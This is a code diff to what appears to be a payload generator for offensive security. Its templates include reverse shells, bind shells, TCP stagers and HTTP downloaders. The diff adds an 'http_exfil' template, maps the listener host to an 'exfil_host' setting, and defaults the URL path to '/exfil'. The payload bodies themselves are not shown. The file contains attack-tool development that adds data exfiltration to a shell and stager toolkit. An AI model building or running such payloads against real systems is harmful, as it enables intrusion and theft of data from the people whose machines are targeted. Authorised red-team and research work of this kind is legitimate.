@@ -760,6 +760,7 @@ def _load_template(name: str) -> PayloadTemplate:
         "tcp_stager":     "Tools.emitter.payload_templates.tcp_stager.TcpStagerTemplate",
         "bind_shell":     "Tools.emitter.payload_templates.bind_shell.BindShellTemplate",
         "http_download":  "Tools.emitter.payload_templates.http_download.HttpDownloadTemplate",
+        "http_exfil":     "Tools.emitter.payload_templates.http_exfil.HttpExfilTemplate",
     }
     if name not in registry:
         raise ValueError(
@@ -782,6 +783,8 @@ _CONFIG_TO_LABEL: dict[str, str] = {
     "src_path": "src_path",
     "dst_path": "dst_path",
     "url": "url",
+    "url_path": "url_path",
+    "lhost": "exfil_host",
 }
 
 
@@ -830,6 +833,8 @@ def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manif
         config.dst_path = "C:\\dest.txt"
     if config.url is None:
         config.url = f"http://{config.lhost}:{config.lport}/payload.exe"
+    if config.url_path is None:
+        config.url_path = "/exfil"
 
     if not changed:
         return manifest
@@ -1195,7 +1200,7 @@ def main() -> None:
     parser.add_argument("manifest", help="Path to manifest YAML file")
     parser.add_argument(
         "--template",
-        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download"],
+        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download", "http_exfil"],
     )
     parser.add_argument("--out", default="emitter_out", help="Output directory")
     parser.add_argument("--lhost", default=None, metavar="IP|IFACE",
@@ -1222,13 +1227,15 @@ def main() -> None:
     lhost = _resolve_lhost(args.lhost) if args.lhost else None
     lport = args.lport
 
-    if args.url is not None and (lhost is None or lport is None):
+    url_path = None
+    if args.url is not None:
         from urllib.parse import urlparse
         parsed = urlparse(args.url)
         if lhost is None and parsed.hostname:
             lhost = parsed.hostname
         if lport is None and parsed.port:
             lport = parsed.port
+        url_path = parsed.path or "/"
 
     if lhost is None:
         lhost = "127.0.0.1"
@@ -1253,6 +1260,7 @@ def main() -> None:
         src_path=args.src,
         dst_path=args.dst,
         url=args.url,
+        url_path=url_path,
         alloc_size=alloc_size,
     )
 
